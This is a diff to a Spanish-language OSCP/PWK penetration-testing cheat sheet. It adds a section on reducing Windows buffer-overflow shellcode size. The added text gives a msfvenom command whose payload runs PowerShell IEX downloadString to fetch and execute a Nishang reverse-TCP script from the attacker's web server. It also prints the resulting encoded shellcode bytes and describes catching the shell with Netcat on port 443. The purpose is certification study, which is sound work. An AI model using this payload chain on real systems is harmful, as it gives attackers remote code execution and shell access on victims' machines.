@@ -4,7 +4,7 @@
 #### Penetration Testing with Kali Linux (PWK) course and Offensive Security Certified Professional (OSCP) Cheat Sheet
 
 ## Índice y Estructura Principal
-- [Antecedentes](#Antecedentes)
+- [Antecedentes - Experiencia Personal](#Antecedentes)
 - [Buffer Overflow Windows (25 puntos)](#buffer-overflow-windows)
      * [Fuzzing](#fuzzing)
      * [Calculando el Offset (Tamaño del Búffer)](#calculando-el-offset)
@@ -670,3 +670,43 @@ De esta forma, variamos la función de salida a un modo hilo... haciendo que lo 
 Tras su ejecución, se podrá comprobar como independientemente del número de veces que se ejecute el exploit, ganaremos siempre acceso al sistema.
 
 #### Reduciendo el Size y Acceso por Powershell
+
+En caso de que nuestro **Size** en el **ESP** antes de que el servicio crashee de otra forma no llegue a los 351 bytes, podemos utilizar un pequeño truco que obtuve haciendo pruebas para reducir el tamaño de nuestro Shellcode.
+
+La idea para este caso, va a ser obtener una sesión reversa TCP vía **Powershell** aprovechando la utilidad de **Nishang**, concretamente la utilidad **Invoke-PowerShellTcp.ps1**. Dado que resultaría tedioso transferir el script, posteriormente dar una instrucción de importación y luego otra de invocación... lo que haremos será hacerlo todo de una, añadiendo en la última línea del script el siguiente contenido:
+
+`Invoke-PowerShellTcp -Reverse -IPAddress nuestraIP -Port 443`
+
+De esta forma, nos aprovecharemos de **msfvenom** para generar una sentencia como la siguiente:
+
+```bash
+$~ msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://127.0.0.1:8000/PS.ps1')" -f c -a x86 --platform windows EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+
+Payload size: 299 bytes
+Final size of c file: 1280 bytes
+unsigned char buf[] = 
+"\xd9\xcb\xbf\xbe\xfd\xc8\xaf\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
+"\x45\x31\x7e\x17\x03\x7e\x17\x83\x50\x01\x2a\x5a\x50\x12\x29"
+"\xa5\xa8\xe3\x4e\x2f\x4d\xd2\x4e\x4b\x06\x45\x7f\x1f\x4a\x6a"
+"\xf4\x4d\x7e\xf9\x78\x5a\x71\x4a\x36\xbc\xbc\x4b\x6b\xfc\xdf"
+"\xcf\x76\xd1\x3f\xf1\xb8\x24\x3e\x36\xa4\xc5\x12\xef\xa2\x78"
+"\x82\x84\xff\x40\x29\xd6\xee\xc0\xce\xaf\x11\xe0\x41\xbb\x4b"
+"\x22\x60\x68\xe0\x6b\x7a\x6d\xcd\x22\xf1\x45\xb9\xb4\xd3\x97"
+"\x42\x1a\x1a\x18\xb1\x62\x5b\x9f\x2a\x11\x95\xe3\xd7\x22\x62"
+"\x99\x03\xa6\x70\x39\xc7\x10\x5c\xbb\x04\xc6\x17\xb7\xe1\x8c"
+"\x7f\xd4\xf4\x41\xf4\xe0\x7d\x64\xda\x60\xc5\x43\xfe\x29\x9d"
+"\xea\xa7\x97\x70\x12\xb7\x77\x2c\xb6\xbc\x9a\x39\xcb\x9f\xf0"
+"\xbc\x59\x9a\xb7\xbf\x61\xa4\xe7\xd7\x50\x2f\x68\xaf\x6c\xfa"
+"\xcc\x4f\x8f\x2e\x39\xf8\x16\xbb\x80\x65\xa9\x16\xc6\x93\x2a"
+"\x92\xb7\x67\x32\xd7\xb2\x2c\xf4\x04\xcf\x3d\x91\x2a\x7c\x3d"
+"\xb0\x5a\xed\xb6\x5e\xe8\x82\x50\xc4\x60\x09\x81\x4f\x3d\x89"
+"\xe9\x01\xd8\x5e\xc7\xd2\x40\xcb\x72\x8e\xf0\x2b\x33\x35\x8c"
+"\x05\x9c\xd0\x0e\x19\x4e\x72\xab\xf3\xfa\xad\x1d\x68\x6c\xd9"
+"\x0f\x1c\x1d\x44\xab\x8f\x95\xf4\x5a\x5e\x31\xd1\xbb\xf6\xc9"
+"\x55\xb3\x3c\x1d\xb9\x02\x73\x56\xeb\x54\x5d\xa8\xdd\xa5\x9b"
+"\xf0\x11\xf5\xeb\x2f\x02\xa6\x25\x40\xd1\x79\x1d\x89\x15";
+```
+
+Como vemos, en este caso en hemos pasado de 351 bytes a 299 bytes. Lo que se debe hacer para acceder al sistema en este caso es simplemente compartir un servidor vía Python en el puerto 8000 (para que desde la máquina se interprete el fichero PS.ps1 [Le hemos cambiado el nombre para reducir los bytes]), y dejar una sesión de escucha vía Netcat por el puerto 443.
+
+Inmediatamente tras ejecutar el script, veremos cómo se recibe un GET desde nuestro servidor web vía Python y cómo en cuestión de segundos ganamos acceso al sistema vía Powershell.
